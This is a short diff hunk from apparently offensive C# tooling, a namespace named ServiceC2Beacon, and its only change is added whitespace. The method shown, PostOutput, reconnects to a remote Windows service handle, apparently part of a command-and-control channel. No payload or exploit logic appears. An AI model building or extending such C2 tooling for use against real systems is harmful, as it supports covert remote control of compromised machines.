@@ -202,7 +202,7 @@ namespace ServiceC2Beacon
         public static bool PostOutput(string host, string serviceName, string output)
         {
             if (schService == IntPtr.Zero)
-            {
+            {   
                 Console.WriteLine("Lost handle... Trying to reestablish");
                 ConnectToService(host, serviceName);
                 if (schService == IntPtr.Zero)
